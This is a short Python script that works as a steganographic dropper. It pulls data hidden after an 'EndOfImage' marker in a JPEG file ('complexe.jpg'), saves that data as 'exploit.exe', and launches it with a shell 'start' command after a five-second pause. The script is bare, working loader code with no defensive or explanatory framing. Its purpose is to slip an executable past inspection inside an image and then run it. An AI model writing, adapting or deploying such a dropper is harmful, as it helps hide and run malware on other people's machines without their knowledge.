import time
import subprocess


def read_binary_file(src):
    with open(src, 'rb') as file:
        binary_data = file.read()
        return binary_data


def save_binary_data_to_image(binary_data, output_src):
    with open(output_src, 'wb') as file:
        file.write(binary_data)
        print("Binary data saved.")


def append_data_to_file(binary_data, src):
    with open(src, 'ab') as file:
        file.write(binary_data)
        print("Separator appended to the file.")


def save_data_to_file(data, output_file):
    with open(output_file, 'wb') as file:
        file.write(data)


def decode_image():
    encoded_image_path = "complexe.jpg"
    output_file_path = "exploit.exe"

    print("Decoding image...")

    with open(encoded_image_path, 'rb') as file:
        binary_data = file.read()

    separator = b'EndOfImage'
    image_data, added_data = binary_data.split(separator, 1)
    save_data_to_file(added_data, output_file_path)


decode_image()

time.sleep(5)
subprocess.run("start \"\" /MAX exploit.exe", shell=True)



